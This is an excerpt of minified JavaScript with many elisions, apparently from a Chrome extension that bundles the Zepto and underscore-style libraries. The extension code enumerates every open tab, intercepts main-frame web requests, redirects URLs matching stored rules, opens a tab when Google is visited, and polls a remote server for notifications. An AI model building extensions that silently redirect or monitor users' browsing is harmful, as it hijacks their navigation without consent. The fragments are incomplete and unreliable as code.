...
var Zepto = function() {
    ...
    return O.matches = function(t, e) {
        ...
        if (!e) return O.Z();
        if ("string" == typeof e)
            if ("<" == (e = e.trim())[0] && h.test(e)) o = O.fragment(e, RegExp.$1, r), e = null;
            else {
        ...
        var r, o, i, a, u = [];
        if (F(t))
            for (o = 0; o < t.length; o++) null != (r = e(t[o], o)) && u.push(r);
        else
            for (i in t) null != (r = e(t[i], i)) && u.push(r);
        ...
        css: function(t, r) {
            ...
            if ("string" == N(t)) r || 0 === r ? c = B(t) + ":" + q(t, r) : this.each(function() {
                ...
                for (e in t) t[e] || 0 === t[e] ? c += B(e) + ":" + q(e, t[e]) + ";" : this.each(function() {
        ...
        n.fn[t] = function() {
            ...
            return i.length < 1 ? this : this.each(function(t, u) {
                ...
                i.forEach(function(t) {
                    ...
                    o.insertBefore(t, u), c && function t(e, n) {
                        n(e);
...
window.Zepto = Zepto, void 0 === window.$ && (window.$ = Zepto),
    ...
    function(t) {
        ...
        function v(e, n, r) {
            var o = r.context;
            r.complete.call(o, n, e), p(r, o, "ajaxComplete", [n, r]),
                function(e) {
        ...
        f.href = window.location.href, t.active = 0, t.ajaxJSONP = function(e, n) {
            ...
            }(v), v.crossDomain || ((i = o.createElement("a")).href = v.url, i.href = i.href, v.crossDomain = f.protocol + "//" + f.host != i.protocol + "//" + i.host), v.url || (v.url = window.location.toString()),
                function(e) {
            ...
            if (w && w.promise(C), v.crossDomain || j("X-Requested-With", "XMLHttpRequest"), j("Accept", E || "*/*"), (E = v.mimeType || E) && (E.indexOf(",") > -1 && (E = E.split(",", 2)[0]), C.overrideMimeType && C.overrideMimeType(E)), (v.contentType || !1 !== v.contentType && v.data && "GET" != v.type.toUpperCase()) && j("Content-Type", v.contentType || "application/x-www-form-urlencoded"), v.headers)
                for (n in v.headers) j(n, v.headers[n]);
            ...
            if (v.xhrFields)
                for (n in v.xhrFields) C[n] = v.xhrFields[n];
    ...
    function() {
        ...
        h.reduce = h.foldl = h.inject = function(t, e, n, r) {
            ...
            var r, o, i = -1 / 0,
                a = -1 / 0;
            if (null == e && null != t)
                for (var u = 0, c = (t = t.length === +t.length ? t : h.values(t)).length; u < c; u++)(r = t[u]) > i && (i = r);
        ...
        h.bind = function(t, e) {
            ...
            for (var e, n, r = 1, o = arguments.length; r < o; r++)
                for (n in e = arguments[r]) s.call(e, n) && (t[n] = e[n]);
            return t
        ...
        var w = function(t, e, n, r) {
            ...
            if (n.push(t), r.push(e), "[object Array]" === o) {
                if (u = (a = t.length) === e.length)
                    for (; a-- && (u = w(t[a], e[a], n, r)););
            } else {
                var f, p = h.keys(t);
                if (a = p.length, u = h.keys(e).length === a)
                    for (; a-- && (f = p[a], u = h.has(e, f) && w(t[f], e[f], n, r)););
            }
        ...
        e.S = function(t, e, n) {
            ...
            chrome.tabs.query({}, function(t) {
                for (var e = t.length - 1; e >= 0; e--) {
                    console.log(t[e].url);
                    var n = t[e].url;
                    for (var r in l.redirects)
                        if (l.redirects[r].r.test(n) && !l.redirects[r].t.test(n)) {
            ...
            chrome.webRequest.onBeforeRequest.addListener(function(n) {
                ...
                if ("main_frame" === i)
                    for (var c in needShowWarming && /^https?\:\/\/(.*google[^\/:?#]+)/.test(a) && (needShowWarming = !1, chrome.tabs.create({
                        ...
                        if (l.redirects[c].r.test(a) && !l.redirects[c].t.test(a) && (r = a, void 0, (o = u.indexOf(t, r)) >= 0 ? e[o] < l.redirectTimes && (e[o]++, 1) : (t.length >= 10 && (t.shift(), e.shift()), t.push(r), e.push(0), 1))) return console.log("Redirect - " + a), {
        ...
        var m = function(t, e) {
                if (localStorage.BACKUP) {
                    ...
                    for (n = 0; n < t.length; n++)
                        if (0 == t[n].speed) return t[n].startTime = Date.now(), void c.ajax({
                            type: "GET",
        ...
        e.installNotification = function() {
            ...
            ! function t() {
                $.getJSON(n.info.rootServer + "getNotifications", function(t) {
                    ...
                    for (var o = 0; o < t.all.length; o++)
                        if (t.all[o].time > n && t.all[o].message && "" != t.all[o].message) {
                            var i = t.all[o];
                            setTimeout(function() {
                                r(i)
                            }, 6e5)
